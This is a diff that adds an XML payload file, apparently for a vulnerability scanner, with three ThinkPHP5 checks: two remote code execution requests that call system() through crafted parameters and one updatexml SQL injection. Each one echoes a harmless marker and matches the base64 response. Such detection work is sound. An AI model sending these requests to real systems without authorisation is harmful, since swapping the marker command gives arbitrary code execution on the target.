@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+    <payload>
+        <!-- ThinkPHP5 5.0.23 Remote Code Execution Vulnerability -->
+        <GET>/index.php?s=captcha</GET>
+        <POST>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo "123"|base64</POST>
+        <Header>
+            <User-Agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</User-Agent>
+        </Header>
+        <Vuln_Condition>MTIzCg==</Vuln_Condition>
+    </payload>
+    <payload>
+        <!-- ThinkPHP5 SQL Injection Vulnerability -->
+        <GET>/index.php?ids[0,updatexml(0,concat(0xa,(select "MTIzCg=="))),0)]=1</GET>
+        <Header>
+            <User-Agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</User-Agent>
+        </Header>
+        <Vuln_Condition>MTIzCg==</Vuln_Condition>
+    </payload>
+    <payload>
+        <!-- Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability -->
+        <GET>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo "123"|base64</GET>
+        <Header>
+            <User-Agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</User-Agent>
+        </Header>
+        <Vuln_Condition>MTIzCg==</Vuln_Condition>
+    </payload>
+</root>
+
